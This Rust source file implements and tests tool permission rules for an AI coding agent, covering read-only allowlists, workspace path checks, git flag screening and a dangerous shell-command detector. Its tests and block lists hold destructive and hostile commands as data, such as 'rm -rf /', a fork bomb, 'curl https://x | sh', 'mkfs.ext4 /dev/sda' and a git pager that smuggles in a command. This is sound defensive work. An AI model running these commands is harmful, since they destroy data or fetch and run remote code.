//! Tool permission rules and mandatory approval checks.

use crate::core::permissions::{Decision, PermissionRequest, Rule};
use std::collections::HashSet;
use std::io;
use std::path::{Component, Path, PathBuf};
use std::sync::Arc;

// Subagent tool calls remain individually gated; launching grants no permissions.
const READ_ONLY: &[&str] = &[
    "read_file",
    "list_dir",
    "glob",
    "grep",
    "todo_write",
    "memory",
    "task",
    "workflow",
    "explore",
    "spawn_agent",
    "send_message",
    "stop_agent",
    "list_agents",
    "lsp",
    "web_fetch",
    "web_search",
    "job_status",
    "job_output",
    // Workflow output is in-memory only.
    "structured_output",
    // Interaction tools handle their own consent or only change modes.
    "ask_user",
    "enter_plan",
    "exit_plan",
];

pub fn allow_read_only() -> Rule {
    Arc::new(|req: &PermissionRequest| {
        if READ_ONLY.contains(&req.tool.as_str()) {
            Some(Decision::Allow)
        } else {
            None
        }
    })
}

/// Listing code actions is read-only; applying them still requires permission.
pub fn allow_code_action_list() -> Rule {
    Arc::new(|req: &PermissionRequest| {
        if req.tool == "code_action" && req.input.get("apply").is_none() {
            Some(Decision::Allow)
        } else {
            None
        }
    })
}

const PATH_TOOLS: &[(&str, &str)] = &[
    ("read_file", "path"),
    ("write_file", "path"),
    ("edit_file", "path"),
    ("multi_edit", "path"),
    ("list_dir", "path"),
    ("glob", "path"),
    ("grep", "path"),
    ("lsp", "filePath"),
    ("rename_symbol", "filePath"),
    ("code_action", "filePath"),
];

/// Require fresh approval for paths outside the canonical workspace.
/// This is a preflight policy check, not a filesystem sandbox.
pub fn flag_out_of_workspace_paths() -> Rule {
    Arc::new(|req: &PermissionRequest| {
        if let Some((_, key)) = PATH_TOOLS.iter().find(|(t, _)| *t == req.tool) {
            let path = req.input.get(*key).and_then(|v| v.as_str()).unwrap_or(".");
            let escapes = if req.tool == "glob" {
                req.input
                    .get("pattern")
                    .and_then(|v| v.as_str())
                    .is_none_or(|pattern| glob_escapes_workspace(&req.cwd, path, pattern))
            } else {
                path_escapes_workspace(&req.cwd, path)
            };
            if escapes {
                return Some(Decision::RequireApproval);
            }
            return None;
        }
        // Path escapes require approval even for allowlisted commands.
        if req.tool == "bash" {
            if let Some(bash) = req.bash.as_ref() {
                for arg in bash.commands.iter().flatten().chain(&bash.redirect_paths) {
                    let path = arg.split_once('=').map_or(arg.as_str(), |(_, value)| value);
                    if !path.starts_with('-') && path_escapes_workspace(&req.cwd, path) {
                        return Some(Decision::RequireApproval);
                    }
                }
            }
        }
        None
    })
}

/// Resolve existing components before interpreting `..`, retaining missing suffixes.
/// Callers performing I/O must revalidate the mapping at the point of use.
pub fn resolve_workspace_path(cwd: &Path, path: &Path) -> io::Result<PathBuf> {
    let mut resolved = if path.is_absolute() {
        PathBuf::new()
    } else {
        cwd.canonicalize()?
    };
    for component in path.components() {
        match component {
            Component::CurDir => {}
            Component::ParentDir => {
                resolved.pop();
            }
            Component::Normal(name) => {
                resolved.push(name);
                match std::fs::symlink_metadata(&resolved) {
                    Ok(_) => resolved = resolved.canonicalize()?,
                    Err(error) if error.kind() == io::ErrorKind::NotFound => {}
                    Err(error) => return Err(error),
                }
            }
            Component::RootDir | Component::Prefix(_) => resolved.push(component.as_os_str()),
        }
    }
    Ok(resolved)
}

pub fn path_escapes_workspace(cwd: &str, path: &str) -> bool {
    if path.starts_with('~') {
        return true;
    }
    let Ok(root) = Path::new(cwd).canonicalize() else {
        return true;
    };
    match resolve_workspace_path(&root, Path::new(path)) {
        Ok(resolved) => !resolved.starts_with(root),
        Err(_) => true,
    }
}

/// Validate the effective glob root without traversing wildcard matches.
pub fn glob_escapes_workspace(cwd: &str, path: &str, pattern: &str) -> bool {
    if path_escapes_workspace(cwd, path) || pattern.starts_with('~') {
        return true;
    }
    let mut prefix = PathBuf::new();
    let mut wildcard = false;
    for component in Path::new(pattern).components() {
        let dynamic = matches!(component, Component::Normal(name)
            if name.to_string_lossy().contains(['*', '?', '[', ']']));
        if dynamic {
            wildcard = true;
        }
        if wildcard {
            // Parent traversal after a wildcard cannot be bounded by its static root.
            if matches!(component, Component::ParentDir) {
                return true;
            }
        } else {
            prefix.push(component.as_os_str());
        }
    }
    let base = match resolve_workspace_path(Path::new(cwd), Path::new(path)) {
        Ok(base) => base,
        Err(_) => return true,
    };
    let effective = base.join(prefix);
    path_escapes_workspace(cwd, &effective.to_string_lossy())
}

/// Require fresh approval for destructive or incompletely analyzed shell input.
pub fn flag_dangerous_bash() -> Rule {
    Arc::new(|req: &PermissionRequest| {
        if req.tool != "bash" {
            return None;
        }
        let Some(bash) = req.bash.as_ref() else {
            return Some(Decision::RequireApproval);
        };

        if !bash.analyzable || bash.pipes_to_shell {
            return Some(Decision::RequireApproval);
        }

        // Match fork bombs in raw text because command analysis cannot model them.
        let raw_nospace: String = bash.raw.chars().filter(|c| !c.is_whitespace()).collect();
        if raw_nospace.contains(":(){:|:&};:") {
            return Some(Decision::RequireApproval);
        }

        for argv in &bash.commands {
            let cmd = match argv.first() {
                Some(c) => c,
                None => continue,
            };
            let mut name = cmd.rsplit('/').next().unwrap_or(cmd);
            // Inspect the wrapped command, not just the launcher.
            let mut rest = &argv[1..];
            name = name.trim_start_matches('\\');
            while matches!(
                name,
                "env" | "sudo" | "doas" | "command" | "nice" | "nohup" | "time"
            ) {
                match rest.first() {
                    Some(next) => {
                        if next.starts_with('-') || next.contains('=') {
                            return Some(Decision::RequireApproval);
                        }
                        name = next
                            .rsplit('/')
                            .next()
                            .unwrap_or(next)
                            .trim_start_matches('\\');
                        rest = &rest[1..];
                    }
                    None => break,
                }
            }
            let args = rest;

            if name == "rm" {
                let recursive = args
                    .iter()
                    .any(|a| a == "--recursive" || (a.starts_with('-') && a.contains('r')));
                if recursive && args.iter().any(|a| is_dangerous_delete_path(a)) {
                    return Some(Decision::RequireApproval);
                }
            }
            if name == "find"
                && args
                    .iter()
                    .any(|a| a == "-delete" || a == "-exec" || a == "-execdir")
            {
                return Some(Decision::RequireApproval);
            }
            if name == "dd" && args.iter().any(|a| a.starts_with("of=/dev/")) {
                return Some(Decision::RequireApproval);
            }
            if name == "shutdown"
                || name == "reboot"
                || name == "halt"
                || name == "poweroff"
                || name == "shred"
                || name.starts_with("mkfs")
            {
                return Some(Decision::RequireApproval);
            }
            if (name == "chmod" || name == "chown")
                && args.iter().any(|a| a.starts_with('-') && a.contains('R'))
                && args.iter().any(|a| is_dangerous_delete_path(a))
            {
                return Some(Decision::RequireApproval);
            }
        }
        None
    })
}

fn is_dangerous_delete_path(a: &str) -> bool {
    let p = a.trim_end_matches('/');
    p.is_empty() // was just "/"
        || a == "/*"
        || a == "~"
        || a.starts_with("~/")
        || a == "$HOME"
        || a.starts_with("$HOME/")
        || a.starts_with("/*")
        || matches!(
            p,
            "/etc" | "/usr" | "/var" | "/bin" | "/sbin" | "/lib" | "/boot" | "/dev"
                | "/System" | "/Applications" | "/home" | "/root" | "/Users"
        )
}

// Interpreters and exec-wrappers hide execution in arguments; ignore name allowlists.
const NEVER_AUTO_ALLOW: &[&str] = &[
    "sh",
    "bash",
    "zsh",
    "dash",
    "fish",
    "ksh",
    "python",
    "python3",
    "node",
    "deno",
    "bun",
    "ruby",
    "perl",
    "php",
    "lua",
    "Rscript",
    "osascript",
    "env",
    "xargs",
    "find",
    "eval",
    "exec",
    "command",
    "nice",
    "nohup",
    "time",
    "timeout",
    "sudo",
    "doas",
    "ssh",
    "watch",
    "make",
    "awk",
    "gawk",
];

fn base_name(cmd: &str) -> &str {
    cmd.rsplit('/').next().unwrap_or(cmd)
}

const GIT_READ_ONLY_SUBCOMMANDS: &[&str] = &[
    "status",
    "diff",
    "show",
    "log",
    "branch",
    "tag",
    "describe",
    "rev-parse",
    "ls-files",
    "ls-remote",
    "cat-file",
    "blame",
    "shortlog",
    "remote",
    "reflog",
    "whatchanged",
    "grep",
];

// Git flags can enable execution or mutation even for read-only subcommands.
fn git_is_read_only(args: &[String]) -> bool {
    let mut i = 0;
    while let Some(arg) = args.get(i) {
        if arg == "--no-pager" || arg == "--no-optional-locks" {
            i += 1;
            continue;
        }
        if arg.starts_with('-') {
            return false;
        }
        break;
    }
    let Some(sub) = args.get(i) else { return false };
    let rest = &args[i + 1..];
    if rest.iter().any(|arg| {
        let flag = arg.split('=').next().unwrap_or(arg);
        (flag.len() > 2
            && [
                "--output",
                "--ext-diff",
                "--textconv",
                "--exec",
                "--upload-pack",
                "--open-files-in-pager",
                "--filters",
            ]
            .iter()
            .any(|blocked| blocked.starts_with(flag) || flag.starts_with(*blocked)))
            || (sub == "grep" && arg.starts_with("-O"))
    }) {
        return false;
    }
    match sub.as_str() {
        "branch" | "tag" => {
            let listing = rest.iter().any(|arg| arg == "--list" || arg == "-l");
            rest.iter().all(|arg| {
                matches!(
                    arg.as_str(),
                    "--list"
                        | "-l"
                        | "--all"
                        | "-a"
                        | "--remotes"
                        | "-r"
                        | "--verbose"
                        | "-v"
                        | "-vv"
                        | "--show-current"
                ) || (listing && !arg.starts_with('-'))
            })
        }
        "remote" => {
            rest.is_empty()
                || (rest.len() == 1 && matches!(rest[0].as_str(), "-v" | "--verbose"))
                || (rest.len() == 2 && rest[0] == "get-url" && !rest[1].starts_with('-'))
                || (rest.len() == 3
                    && rest[0] == "show"
                    && rest[1] == "-n"
                    && !rest[2].starts_with('-'))
        }
        "reflog" => rest.is_empty() || (rest.len() == 1 && rest[0] == "show"),
        _ => GIT_READ_ONLY_SUBCOMMANDS.contains(&sub.as_str()),
    }
}

/// Reject incomplete analysis, output redirections, and execution wrappers.
pub fn allow_bash_commands(names: Vec<String>) -> Rule {
    let set: HashSet<String> = names.into_iter().collect();
    Arc::new(move |req: &PermissionRequest| {
        if req.tool != "bash" {
            return None;
        }
        let bash = req.bash.as_ref()?;
        // Fail closed on incomplete analysis.
        if !bash.analyzable || bash.commands.is_empty() {
            return None;
        }
        // Redirections mutate files independently of the command name.
        if bash.has_output_redirect {
            return None;
        }
        // Check every command, including nested substitutions and pipelines.
        let all_safe = bash.commands.iter().all(|argv| {
            let name = match argv.first() {
                Some(c) => base_name(c),
                None => return false,
            };
            if NEVER_AUTO_ALLOW.contains(&name) || !set.contains(name) {
                return false;
            }
            if name == "git" {
                return git_is_read_only(&argv[1..]);
            }
            true
        });
        if all_safe {
            Some(Decision::Allow)
        } else {
            None
        }
    })
}

pub fn allow_tools(names: Vec<String>) -> Rule {
    let set: HashSet<String> = names.into_iter().collect();
    Arc::new(move |req: &PermissionRequest| {
        if set.contains(&req.tool) {
            Some(Decision::Allow)
        } else {
            None
        }
    })
}

pub fn deny_tools(names: Vec<String>) -> Rule {
    let set: HashSet<String> = names.into_iter().collect();
    Arc::new(move |req: &PermissionRequest| {
        if set.contains(&req.tool) {
            Some(Decision::Deny)
        } else {
            None
        }
    })
}

#[cfg(test)]
mod tests {
    use super::*;

    fn req(tool: &str) -> PermissionRequest {
        PermissionRequest {
            tool: tool.to_string(),
            input: serde_json::Value::Null,
            cwd: ".".to_string(),
            bash: None,
            preview: None,
            agent: None,
            read_only: false,
        }
    }

    fn bash_req(raw: &str) -> PermissionRequest {
        PermissionRequest {
            input: serde_json::json!({ "command": raw }),
            bash: Some(crate::core::permissions::parse_bash(raw)),
            ..req("bash")
        }
    }

    #[test]
    fn git_allowlist_distinguishes_read_only_from_mutation_and_execution() {
        let rule = allow_bash_commands(vec!["git".into(), "ls".into()]);
        for raw in [
            "git branch feature",
            "git branch -d feature",
            "git branch -D feature",
            "git branch -m old new",
            "git branch --set-upstream-to=origin/main",
            "git branch --edit-description",
            "git tag release",
            "git tag -d release",
            "git tag -f release",
            "git remote add upstream local",
            "git remote remove origin",
            "git remote set-url origin local",
            "git remote rename old new",
            "git remote update",
            "git reflog expire --all",
            "git reflog delete HEAD",
            "git reflog drop refs/heads/main",
            "git diff --output=result",
            "git log --output result",
            "git show --ext-diff",
            "git show --textconv",
            "git ls-remote --upload-pack=printf local",
            "git --paginate log",
            "git branch --list --delete feature",
            "git diff --out=result",
            "git ls-remote --upload-p=printf local",
            "git grep --open-files-in-pager=printf hello",
            "git grep -Oprintf hello",
            "git cat-file --filters HEAD:file",
            "git commit -m x",
            "git add .",
            "git push",
            "git reset --hard",
            "git clean -fd",
            "git -c core.pager=touch\\ pwned log",
            "git -C /etc status",
            "git foobar",
        ] {
            assert_eq!(rule(&bash_req(raw)), None, "must not auto-allow: {raw}");
        }
        for raw in [
            "git branch",
            "git branch --list feature",
            "git branch -a",
            "git branch --show-current",
            "git tag",
            "git tag --list release",
            "git remote",
            "git remote -v",
            "git remote get-url origin",
            "git remote show -n origin",
            "git reflog",
            "git reflog show",
            "git --no-pager status",
            "git status",
            "git log --oneline",
            "git diff HEAD",
            "git show",
            "git rev-parse HEAD",
        ] {
            assert_eq!(rule(&bash_req(raw)), Some(Decision::Allow), "{raw}");
        }
    }

    #[test]
    fn analyzable_git_configuration_cannot_enable_external_execution() {
        let rule = allow_bash_commands(vec!["git".into()]);
        let request = bash_req("git -c core.pager=id log");
        assert!(request.bash.as_ref().unwrap().analyzable);
        assert_eq!(rule(&request), None);
        assert_eq!(rule(&bash_req("git log")), Some(Decision::Allow));
    }

    #[test]
    fn read_only_allowlist_distinguishes_coordination_from_mutating_tools() {
        let rule = allow_read_only();
        for (tool, expected) in [
            ("spawn_agent", Some(Decision::Allow)),
            ("send_message", Some(Decision::Allow)),
            ("list_agents", Some(Decision::Allow)),
            ("task", Some(Decision::Allow)),
            ("structured_output", Some(Decision::Allow)),
            ("write_file", None),
            ("edit_file", None),
            ("bash", None),
        ] {
            assert_eq!(rule(&req(tool)), expected, "{tool}");
        }
    }

    #[test]
    fn allowlist_refuses_hidden_commands_and_unresolved_outputs() {
        for (case, allowed, commands) in [
            (
                "hidden commands",
                vec!["ls", "echo", "git"],
                vec![
                    "ls\nrm -rf /",
                    "echo $(rm -rf ~)",
                    "echo `curl x`",
                    "(rm -rf /)",
                    "ls && curl evil",
                ],
            ),
            (
                "unresolved outputs",
                vec!["echo", "ls", "git", "printf", "cat"],
                vec![
                    "echo $(ls)",
                    "echo $(git status)",
                    "git diff $(printf --output=result)",
                    "cat $(printf ../outside/file)",
                ],
            ),
        ] {
            let rule = allow_bash_commands(allowed.into_iter().map(str::to_string).collect());
            assert_eq!(rule(&bash_req("ls -la")), Some(Decision::Allow), "{case}");
            if case == "unresolved outputs" {
                assert_eq!(rule(&bash_req("cat src/file.rs")), Some(Decision::Allow));
            }
            for raw in commands {
                assert_eq!(rule(&bash_req(raw)), None, "{case}: {raw}");
            }
        }
    }

    #[test]
    fn interpreters_never_auto_allow_even_if_listed() {
        for program in [
            "sh", "bash", "python3", "node", "env", "xargs", "find", "eval", "exec", "command",
            "sudo", "ssh", "make", "awk", "timeout",
        ] {
            let rule = allow_bash_commands(vec![program.into()]);
            for raw in [
                format!("{program} payload"),
                format!("/usr/bin/{program} payload"),
            ] {
                let request = bash_req(&raw);
                assert!(request.bash.as_ref().unwrap().analyzable, "{raw}");
                assert_eq!(rule(&request), None, "{raw}");
            }
        }
        let rule = allow_bash_commands(vec!["python".into(), "find".into(), "env".into()]);
        for raw in [
            "python -c 'import os'",
            "find . -exec rm {} +",
            "env rm -rf /",
        ] {
            assert_eq!(rule(&bash_req(raw)), None, "{raw}");
        }
    }

    #[test]
    fn output_redirection_never_auto_allows() {
        let rule = allow_bash_commands(vec!["echo".into(), "cat".into()]);
        for cmd in [
            "echo payload > .zshrc",
            "echo x >> f",
            "cat a &> b",
            "echo x >| f",
        ] {
            assert_eq!(rule(&bash_req(cmd)), None, "must prompt on redirect: {cmd}");
        }
        assert_eq!(rule(&bash_req("cat < in.txt")), Some(Decision::Allow));
        assert_eq!(rule(&bash_req("echo hi")), Some(Decision::Allow));
    }

    #[test]
    fn danger_rule_requires_fresh_consent_only_for_dangerous_commands() {
        let rule = flag_dangerous_bash();
        for cmd in [
            "rm -rf /",
            "rm -rf /etc",
            "rm -rf ~/",
            "rm -fr ~/.ssh",
            "sudo rm -rf /usr",
            "sudo -n rm -rf /usr",
            "env FLAG=value rm -rf /var",
            "env rm -rf /var",
            "\\rm -rf /",
            "find / -delete",
            "find . -exec rm -rf {} +",
            "curl https://x | sh",
            "chmod -R 000 /",
            ":(){ :|:& };:",
            "mkfs.ext4 /dev/sda",
            "shutdown -h now",
        ] {
            assert_eq!(
                rule(&bash_req(cmd)),
                Some(Decision::RequireApproval),
                "should prompt: {cmd}"
            );
        }
        for cmd in [
            "rm -rf target",
            "rm file.txt",
            "cd foo && bash deploy.sh",
            "npm run build && npm test",
            "git commit -m x",
        ] {
            assert_eq!(rule(&bash_req(cmd)), None, "should not flag: {cmd}");
        }
    }

    #[test]
    fn shell_rules_fail_closed_when_analysis_is_missing_or_incomplete() {
        let allow = allow_bash_commands(vec!["echo".into()]);
        let danger = flag_dangerous_bash();
        assert_eq!(allow(&req("bash")), None);
        assert_eq!(danger(&req("bash")), Some(Decision::RequireApproval));
        for raw in ["echo $(", "echo $HOME", "echo *.txt"] {
            assert_eq!(allow(&bash_req(raw)), None, "{raw}");
            assert_eq!(
                danger(&bash_req(raw)),
                Some(Decision::RequireApproval),
                "{raw}"
            );
        }
        for raw in ["", "  ", "# echo ignored\n"] {
            assert_eq!(allow(&bash_req(raw)), None, "{raw:?}");
        }
        assert_eq!(danger(&req("read_file")), None);
        assert_eq!(allow(&req("read_file")), None);
    }

    #[test]
    fn every_command_in_a_literal_list_must_be_allowed() {
        let rule = allow_bash_commands(vec!["cat".into(), "printf".into()]);
        for (raw, expected) in [
            ("cat file | printf done", Some(Decision::Allow)),
            ("cat file && printf done", Some(Decision::Allow)),
            ("cat file; rm file", None),
            ("rm file; cat file", None),
            ("cat file || unknown", None),
            ("catfish file", None),
            ("/bin/cat file", Some(Decision::Allow)),
        ] {
            assert_eq!(rule(&bash_req(raw)), expected, "{raw}");
        }
    }

    #[test]
    fn code_action_listing_is_allowed_but_application_and_unrelated_tools_abstain() {
        let rule = allow_code_action_list();
        let mut request = req("code_action");
        request.input = serde_json::json!({"filePath": "src/main.rs", "line": 1, "character": 1});
        assert_eq!(rule(&request), Some(Decision::Allow));
        request.input["apply"] = serde_json::json!("Extract function");
        assert_eq!(rule(&request), None);
        request.tool = "rename_symbol".into();
        request.input = serde_json::json!({});
        assert_eq!(rule(&request), None);
    }

    #[test]
    fn configured_tool_rules_match_exact_names_and_abstain_otherwise() {
        let allow = allow_tools(vec!["edit_file".into()]);
        let deny = deny_tools(vec!["edit_file".into()]);
        assert_eq!(allow(&req("edit_file")), Some(Decision::Allow));
        assert_eq!(deny(&req("edit_file")), Some(Decision::Deny));
        for tool in ["", "edit", "edit_file_extra", "mcp_edit_file", "EDIT_FILE"] {
            assert_eq!(allow(&req(tool)), None, "{tool}");
            assert_eq!(deny(&req(tool)), None, "{tool}");
        }
    }

    mod paths {
        use super::super::*;
        use crate::test_support::TestDir;

        struct Fixture(TestDir);

        impl Fixture {
            fn new() -> Self {
                let dir = TestDir::new();
                std::fs::create_dir(dir.join("workspace")).unwrap();
                std::fs::create_dir_all(dir.join("outside/nested")).unwrap();
                dir.write("outside/file", "fixture");
                Self(dir)
            }

            fn workspace(&self) -> PathBuf {
                self.0.join("workspace")
            }

            fn cwd(&self) -> String {
                self.workspace().to_str().unwrap().to_owned()
            }
        }

        fn req(tool: &str) -> PermissionRequest {
            super::req(tool)
        }

        fn bash_req_cwd(raw: &str, cwd: &str) -> PermissionRequest {
            PermissionRequest {
                input: serde_json::json!({ "command": raw }),
                cwd: cwd.to_string(),
                bash: Some(crate::core::permissions::parse_bash(raw)),
                ..req("bash")
            }
        }

        #[cfg(unix)]
        #[test]
        fn symlinks_and_missing_descendants_use_canonical_ancestors() {
            use std::os::unix::fs::symlink;
            let fixture = Fixture::new();
            let cwd = fixture.cwd();
            symlink(
                fixture.0.join("outside/nested"),
                fixture.workspace().join("link"),
            )
            .unwrap();
            symlink(
                fixture.0.join("outside/file"),
                fixture.workspace().join("file-link"),
            )
            .unwrap();
            symlink(
                fixture.0.join("outside/missing"),
                fixture.workspace().join("dangling"),
            )
            .unwrap();
            symlink("loop", fixture.workspace().join("loop")).unwrap();
            for path in [
                "link",
                "link/new/file",
                "link/../file",
                "file-link",
                "dangling",
                "loop",
            ] {
                assert!(path_escapes_workspace(&cwd, path), "{path}");
            }
            assert_eq!(
                resolve_workspace_path(&fixture.workspace(), Path::new("link/../new/file"))
                    .unwrap(),
                fixture.0.canonicalize().unwrap().join("outside/new/file")
            );
            std::fs::create_dir(fixture.workspace().join("inside")).unwrap();
            symlink("inside", fixture.workspace().join("inside-link")).unwrap();
            assert!(!path_escapes_workspace(&cwd, "inside-link/new/file"));
            assert!(!path_escapes_workspace(&cwd, "inside-link/../new/file"));
            let rule = flag_out_of_workspace_paths();
            assert_eq!(
                rule(&bash_req_cwd("cat file-link", &cwd)),
                Some(Decision::RequireApproval)
            );
        }

        #[test]
        fn glob_checks_effective_root_and_parent_traversal() {
            let fixture = Fixture::new();
            let cwd = fixture.cwd();
            for pattern in ["../outside/*", "*/../../outside/*", "**/../file"] {
                assert!(glob_escapes_workspace(&cwd, ".", pattern), "{pattern}");
            }
            let outside = fixture.0.join("outside").join("*");
            assert!(glob_escapes_workspace(
                &cwd,
                ".",
                &outside.to_string_lossy()
            ));
            assert!(glob_escapes_workspace(&cwd, "../outside", "*.rs"));
            assert!(!glob_escapes_workspace(&cwd, ".", "src/**/*.rs"));
            assert!(!glob_escapes_workspace(
                &cwd,
                ".",
                &fixture
                    .workspace()
                    .join("**")
                    .join("*.rs")
                    .to_string_lossy()
            ));
            let mut request = req("glob");
            request.cwd = cwd;
            for pattern in ["../outside/*", outside.to_str().unwrap()] {
                request.input = serde_json::json!({"pattern": pattern});
                assert_eq!(
                    flag_out_of_workspace_paths()(&request),
                    Some(Decision::RequireApproval)
                );
            }
        }

        #[cfg(unix)]
        #[test]
        fn glob_static_prefix_resolves_symlinks() {
            let fixture = Fixture::new();
            std::os::unix::fs::symlink(fixture.0.join("outside"), fixture.workspace().join("link"))
                .unwrap();
            assert!(glob_escapes_workspace(&fixture.cwd(), ".", "link/*.rs"));
            assert!(glob_escapes_workspace(&fixture.cwd(), "link", "*.rs"));
        }

        #[test]
        fn workspace_escape_detection() {
            let fixture = Fixture::new();
            let cwd = fixture.cwd();
            for (path, expected) in [
                ("../outside/file", true),
                ("~/.config/example", true),
                ("sub/../../outside", true),
                ("src/main.rs", false),
                ("./a/../b", false),
                (".", false),
            ] {
                assert_eq!(path_escapes_workspace(&cwd, path), expected, "{path}");
            }
            assert!(!path_escapes_workspace(&cwd, &format!("{cwd}/src/x")));
            assert!(path_escapes_workspace(
                &format!("{cwd}/missing-root"),
                "file"
            ));
        }

        #[test]
        fn out_of_workspace_file_tool_prompts_but_in_workspace_abstains() {
            let fixture = Fixture::new();
            let rule = flag_out_of_workspace_paths();
            for (tool, path, expected) in [
                (
                    "read_file",
                    "../outside/file",
                    Some(Decision::RequireApproval),
                ),
                (
                    "write_file",
                    "../outside/new-file",
                    Some(Decision::RequireApproval),
                ),
                ("read_file", "src/main.rs", None),
            ] {
                let request = PermissionRequest {
                    input: serde_json::json!({ "path": path }),
                    cwd: fixture.cwd(),
                    ..req(tool)
                };
                assert_eq!(rule(&request), expected, "{tool}: {path}");
            }
            assert_eq!(rule(&req("todo_write")), None);
        }

        #[test]
        fn path_policy_covers_file_and_language_tools_without_touching_targets() {
            let fixture = Fixture::new();
            let rule = flag_out_of_workspace_paths();
            for (tool, key) in [
                ("read_file", "path"),
                ("write_file", "path"),
                ("edit_file", "path"),
                ("multi_edit", "path"),
                ("list_dir", "path"),
                ("grep", "path"),
                ("lsp", "filePath"),
                ("rename_symbol", "filePath"),
                ("code_action", "filePath"),
            ] {
                for (path, expected) in [
                    ("new/inside", None),
                    ("../outside/new", Some(Decision::RequireApproval)),
                ] {
                    let mut request = req(tool);
                    request.cwd = fixture.cwd();
                    request.input = serde_json::json!({});
                    request.input[key] = serde_json::json!(path);
                    assert_eq!(rule(&request), expected, "{tool}: {path}");
                }
            }
            assert!(!fixture.workspace().join("new").exists());
            assert!(!fixture.0.join("outside/new").exists());
            assert_eq!(
                std::fs::read_to_string(fixture.0.join("outside/file")).unwrap(),
                "fixture"
            );
        }

        #[test]
        fn glob_policy_requires_a_pattern_and_bounds_it_relative_to_the_search_path() {
            let fixture = Fixture::new();
            let rule = flag_out_of_workspace_paths();
            for (input, expected) in [
                (serde_json::json!({}), Some(Decision::RequireApproval)),
                (
                    serde_json::json!({"pattern": 42}),
                    Some(Decision::RequireApproval),
                ),
                (
                    serde_json::json!({"path": ".", "pattern": "src/*.rs"}),
                    None,
                ),
                (
                    serde_json::json!({"path": "nested", "pattern": "../*.rs"}),
                    None,
                ),
                (
                    serde_json::json!({"path": "nested", "pattern": "../../outside/*"}),
                    Some(Decision::RequireApproval),
                ),
            ] {
                let request = PermissionRequest {
                    input,
                    cwd: fixture.cwd(),
                    ..req("glob")
                };
                assert_eq!(rule(&request), expected, "{}", request.input);
            }
            assert!(!fixture.workspace().join("nested").exists());
        }

        #[test]
        fn workspace_containment_uses_path_components_not_string_prefixes() {
            let fixture = Fixture::new();
            let sibling = fixture.0.join("workspace-other/new");
            assert!(path_escapes_workspace(
                &fixture.cwd(),
                &sibling.to_string_lossy()
            ));
            let root = fixture.workspace().canonicalize().unwrap();
            assert_eq!(
                resolve_workspace_path(&root, Path::new("missing/../new/file")).unwrap(),
                root.join("new/file")
            );
            assert!(!fixture.workspace().join("missing").exists());
            assert!(!fixture.workspace().join("new").exists());
        }

        #[test]
        fn out_of_workspace_bash_arg_prompts() {
            let fixture = Fixture::new();
            let cwd = fixture.cwd();
            let rule = flag_out_of_workspace_paths();
            for raw in [
                "cat ../outside/file",
                "cat < ../outside/file",
                "printf hi > ../outside/new",
                "cat --file=../outside/file",
            ] {
                assert_eq!(
                    rule(&bash_req_cwd(raw, &cwd)),
                    Some(Decision::RequireApproval),
                    "{raw}"
                );
            }
            for raw in ["cat src/main.rs", "ls -la", "npm run build"] {
                assert_eq!(rule(&bash_req_cwd(raw, &cwd)), None, "{raw}");
            }
        }
    }
}
